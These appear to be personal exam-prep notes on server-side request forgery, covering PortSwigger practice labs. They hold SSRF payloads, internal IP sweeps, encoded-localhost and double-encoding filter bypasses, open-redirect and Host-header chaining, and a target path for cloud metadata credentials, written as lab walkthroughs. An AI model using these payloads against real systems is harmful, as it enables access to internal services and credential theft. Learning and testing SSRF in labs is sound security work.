## Stage 3
### What is it?
Vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location. May be able to force the server to connect to arbitrary external systems or to internal services. 

### Look for
- Request body contain a hostname pointing to a resource like `stockApi=http://api.store.com/stock`
- Retrieve out of band connection (aka to Burp collab) via `Referer`
- Need to double URL encode sometimes like `a` > `%61` > `%2561` in `/admin`
- `Location` header reflects a request param
```
stockApi=http://localhost/admin
stockApi=http://192.168.0.$X$:8080/admin
```

### Exam
**Need to specify port 6566 in the exam** like for example:
- http://localhost:6566/home/carlos/secret
- stockApi=http://localhost:6566/home/carlos/secret
- or use `127.0.0.1` but `localhost` should work

### Bypasses
https://h.43z.one/ipconverter/
```
▶️Type in http://2130706433 instead of http://127.0.0.1
▶️Hex Encoding 127.0.0.1 translates to 0x7f.0x0.0x0.0x1
▶️Octal Encoding 127.0.0.1 translates to 0177.0.0.01
▶️Mixed Encoding 127.0.0.1 translates to 0177.0.0.0x1
```

### Identify Vulnerabilities in Exam
Can target scan something like the check stock `stockApi` param and see 
- Out-of-band resource load (HTTP)
- External service interaction (HTTP)
![SSRF-20260220214629740](SSRF-20260220214629740.png)

Sample payloads
```
/product/nextProduct?currentProductId=6&path=https://EXPLOIT.net  

stockApi=http://localhost:6566/admin  

http://127.1:6566/admin  

Host: localhost
```


- `GET /` 
	- `Host: www.hacker.com`
		- "Client Error: Forbidden"
			- [SSRF](SSRF.md#1.x.%20Lab%20SSRF%20via%20flawed%20request%20parsing%20%E2%AD%95%EF%B8%8F)

- `stockAPI` in `POST /product/stock`
	- [SSRF](SSRF.md#3.1.%20Lab%20Basic%20SSRF%20against%20the%20local%20server%20%E2%AD%95%EF%B8%8F)
	- [SSRF](SSRF.md#3.2.%20Lab%20Basic%20SSRF%20against%20another%20back-end%20system%20%E2%AD%95%EF%B8%8F)
	- [SSRF](SSRF.md#3.4.%20Lab%20SSRF%20with%20blacklist-based%20input%20filter%20%E2%AD%95%EF%B8%8F)
	- [SSRF](SSRF.md#3.5.%20Lab%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability%20%E2%AD%95%EF%B8%8F)

- `GET /product?productId=1` set `Referer` to Burp Collaborator
	- [SSRF](SSRF.md#3.3.%20Lab%20Blind%20SSRF%20with%20out-of-band%20detection%20%E2%AD%95%EF%B8%8F)

#### `stockApi` or URL-encoded URL looking thing
200 OK from any of the payloads below or *burp scan: "Out-of-band resource load (HTTP)"*
```
http://127.0.0.1:6566/admin
http://localhost:6566/admin
```
- **Stage 2** - [SSRF](SSRF.md#3.1.%20Lab%20Basic%20SSRF%20against%20the%20local%20server%20%E2%AD%95%EF%B8%8F)

stockApi show `192.168.0.1:8080` or *burp scan: Out-of-band resource load (HTTP) + External service interaction (HTTP)*
Intruder > set a position for X and go from 0-255
```
http://192.168.0.X:8080/admin
```
- **Stage 2** - [SSRF](SSRF.md#3.2.%20Lab%20Basic%20SSRF%20against%20another%20back-end%20system%20%E2%AD%95%EF%B8%8F)

Double URL encode `a` in `admin` + use `127.1` to get 200 OK
Or capitalize every other letter like `AdMiN` 
Or *burp scan: Out-of-band resource load (HTTP) + External service interaction (HTTP)*
```
http://127.1/%2561dmin

http://127.1/AdMiN/
```
- **Stage 2 -** [SSRF](SSRF.md#3.4.%20Lab%20SSRF%20with%20blacklist-based%20input%20filter%20%E2%AD%95%EF%B8%8F)

`GET /product/nextProduct` with `path` URL param OR Next product button
For exam, change `8080` to `6566`
```
stockapi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```
- **Stage 2 -** [SSRF](SSRF.md#3.5.%20Lab%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability%20%E2%AD%95%EF%B8%8F)

`stockApi`
```
# 1 - 200 OK
http://username@stock.weliketoshop.net/

# 2 - Rejected
http://username#@stock.weliketoshop.net/

# 3 - Encode # and Internal Server Error
http://username%2523@stock.weliketoshop.net/

# 4 - 200 OK
http://localhost:80%2523@stock.weliketoshop.net/admin/
```
- https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter


**Combine this with LFI for Stage 3**


---
#### 3.1. Lab: Basic SSRF against the local server ⭕️
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
1. Select an item > Check stock > notice the `POST /product/stock` endpoint has an URL in the request body
	1. ![SSRF-20260114163721121](SSRF-20260114163721121.png)
2. The URL is URL encoded so highlight it and look at Inspector to see the decoded value
	1. ![SSRF-20260114163809750](SSRF-20260114163809750.png)
3. Enter this payload to gain access to the admin panel: `stockApi=http://localhost/admin`
	1. ![SSRF-20260114163850734](SSRF-20260114163850734.png)
4. Right click > Request in browser > In original session. Click delete on carlos and check the URL. Throw that in the `stockApi` request param and solve.
	1. ![SSRF-20260114164042001](SSRF-20260114164042001.png)
	2. ![SSRF-20260114164128167](SSRF-20260114164128167.png)
>[!tip] How to Identify this Vulnerability?
>1. URL in the request body

---
#### 3.2. Lab: Basic SSRF against another back-end system ⭕️
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.
1. Select an item > Check stock > notice the `POST /product/stock` endpoint has an URL in the request body
	1. ![SSRF-20260114164456271](SSRF-20260114164456271.png)
2. Change the value to `http://192.168.0.X:8080/admin` > Send to Intruder. Set the `X` as a position, Payload type: Numbers, From: 0, To: 255, Step: 1. Start attack.
	1. ![SSRF-20260114164609617](SSRF-20260114164609617.png)
3. Got a 200 OK on `192.168.0.186`
	1. ![SSRF-20260114164642021](SSRF-20260114164642021.png)
4. Repeat Step 4 in the previous lab and solve.
	1. ![SSRF-20260114164744425](SSRF-20260114164744425.png)

**Unsure how to find the specific internal IP address during the exam**

---
#### 3.3. Lab: Blind SSRF with out-of-band detection ⭕️
This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.
1. Select a product > Inspect the `GET /product?productId=2` or whatever request and notice the `Referer` header. Send to Repeater.
	1. ![SSRF-20260114165502401](SSRF-20260114165502401.png)
2. Highlight the URL > right click > Insert Collaborator payload > Send > Poll Collaborator and solved.
	1. ![SSRF-20260114165539153](SSRF-20260114165539153.png)
>[!tip] How to Identify this Vulnerability?
>1. `Referer` header
>2. Burp Collab retrieve DNS/HTTP requests from the app

**No idea on how to leverage this for the exam to either get admin or secret file**

---
#### 3.4. Lab: SSRF with blacklist-based input filter ⭕️
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
1. Select an item > Check stock > notice the `POST /product/stock` endpoint has an URL in the request body
	1. ![SSRF-20260114165844149](SSRF-20260114165844149.png)
2. Tried `127.0.0.1/admin` but got blocked. Also tried other representations of `127.0.0.1` but that didn't work:
	1. `2130706433`, `017700000001`, `127.1`
	2. ![SSRF-20260114165956310](SSRF-20260114165956310.png)
3. Tried URL encoding `a` to `%61` but also got blocked. Encoding it AGAIN and it worked. Follow the final steps in Lab 2 to solve. `http://127.1/%2561dmin`
	1. ![SSRF-20260114170342575](SSRF-20260114170342575.png)
>[!tip] How to Identify this Vulnerability?
>1. URL in the request body

**Use in exam**
```
# double url encode a in admin
http://127.1/%2561dmin

# capitalize every other character
http://127.1/AdMiN/
```

---
#### 3.5. Lab: SSRF with filter bypass via open redirection vulnerability ⭕️
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.
1. Select an item > Check stock > notice the `POST /product/stock` endpoint has an URL in the request body. Send to Repeater.
	1. ![SSRF-20260114170941506](SSRF-20260114170941506.png)
2. Click on `Next product`, observe HTTP History for the `GET /product/nextProduct` request and notice that the URL for the `path` parameter is reflected in the response's `Location`  header. *This gives us an open redirection vulnerability*. Send to Repeater.
	1. ![SSRF-20260114171226307](SSRF-20260114171226307.png)
3. Put this payload in `/product/nextProduct?path=http://192.168.0.12:8080/admin` and get a 302. Now pop that into `stockApi` and Send. It worked!
	1. ![SSRF-20260114171502952](SSRF-20260114171502952.png)
	2. ![SSRF-20260114172138313](SSRF-20260114172138313.png)
4. Add `/delete?username=carlos` to solve.

#ExamTip In this lab they state the admin interface is at `http://192.168.0.12:8080/admin` but in exam use `localhost:6566`.
>[!tip] How to Identify this Vulnerability?
>1. URL in the request body
>2. Request containing a param that reflects in the `Location` header

---
#### 1.x. Lab: SSRF via flawed request parsing ⭕️
*This is under HTTP Host header attacks*
This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

To solve the lab, access the internal admin panel located in the `192.168.0.0/24` range, then delete the user `carlos`. ^66hepo
1. Send `GET /` request to Repeater > Send. Modify the `Host` header > Send > notice we get an error. This means the app is validating the `Host` header. 
	1. ![SSRF-20260114201710463](SSRF-20260114201710463.png)
2. Add the following *absolute URL* in the `GET /` line: `GET https://YOUR-LAB-ID.web-security-academy.net/` and notice a 504 Gateway Timeout. This means that the absolute URL is being validated instead of the `Host` header.
	1. ![SSRF-20260114201959681](SSRF-20260114201959681.png)
3. Insert burp collab url in `Host` and Send and got a 200 OK (*what is the point of this?*)
	1. ![SSRF-20260114202459240](SSRF-20260114202459240.png)
4. Send to Intruder > change `Host` to `192.168.0.X` > add a position on `X`, Payload type: Numbers, from 0 to 255 step 1. **IMPORTANT: uncheck Update Host header to match target**.
	1. ![SSRF-20260114202946309](SSRF-20260114202946309.png)
5. `192.168.0.222` got a 302 response, this is our IP.
	1. ![SSRF-20260114203020663](SSRF-20260114203020663.png)
6. Set `Host: 192.168.0.222` and append `/admin` to the absolute URL, Send and got 200 OK. Grab the csrf token.
	1. ![SSRF-20260114203120152](SSRF-20260114203120152.png)
	2. ![SSRF-20260114203220958](SSRF-20260114203220958.png)
7. Configure the request like the payload below, Send and solve.
	1. ![SSRF-20260114203406094](SSRF-20260114203406094.png)
```
GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?username=carlos&csrf=YOUR-CSRF-TOKEN
```
>[!tip] How to Identify this Vulnerability?
>1. Server validates `Host` header
>2. Modify `Host` and using absolute URL gets 504 Gateway Timeout
>3. `Host` header to insert burp collaborator and get 200 OK

---
#### 3.7. Lab: SSRF via OpenID dynamic client registration [Skipped]
*This lab is under OAuth authentication*
#TODO
This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: `wiener:peter`
1. My account > enter creds > Continue > Continue > 

cannot solve.

>[!tip] How to Identify this Vulnerability?
>1. OAuth feature
>2. 

